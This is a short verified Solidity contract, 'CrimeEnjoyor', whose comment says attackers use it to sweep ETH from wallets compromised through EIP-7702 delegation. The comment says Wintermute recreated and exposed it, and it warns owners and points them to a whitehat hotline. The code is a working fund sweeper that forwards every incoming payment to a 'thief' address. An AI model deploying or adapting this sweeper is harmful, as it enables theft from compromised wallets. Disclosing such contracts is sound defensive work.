// Source: blockscout
// Address: 0x89383882fc2d0cd4d7952a3267a3b6dae967e704
// Chain: 1
// Contract: CrimeEnjoyor
// Compiler: 0.8.20+commit.a1b79de6
// Verified: 2025-06-24T14:10:57.850883Z
pragma solidity 0.8.20;

contract CrimeEnjoyor {

    /* 
        This contract is used by bad guys to automatically sweep all incoming ETH from compromised addresses
        Recreated and exposed by Wintermute
        Check more 7702 data here: https://dune.com/wintermute_research/eip7702

        IF YOU FOUND THIS CONTRACT IN ANY AUTHORIZATION LIST, 
        THE EOA DELEGATED TO IT WAS COMPROMISED!!!
        DO NOT SEND ANY ETH/BNB,
        IT WILL BE IMMEDIATELY SWEPT. 
        IF THIS ADDRESS BELONGS TO YOU, CONTACT FLASHBOTS WHITEHAT HOTLINE FOR HELP: https://whitehat.flashbots.net
    */

    address public destination;

    function initialize(address _thief) public {
        require(_thief != address(0), 'Invalid destination');
        destination = _thief;
    }

    receive() external payable {
        require(destination != address(0), 'Not initialized');
        payable(destination).transfer(msg.value);
    }
}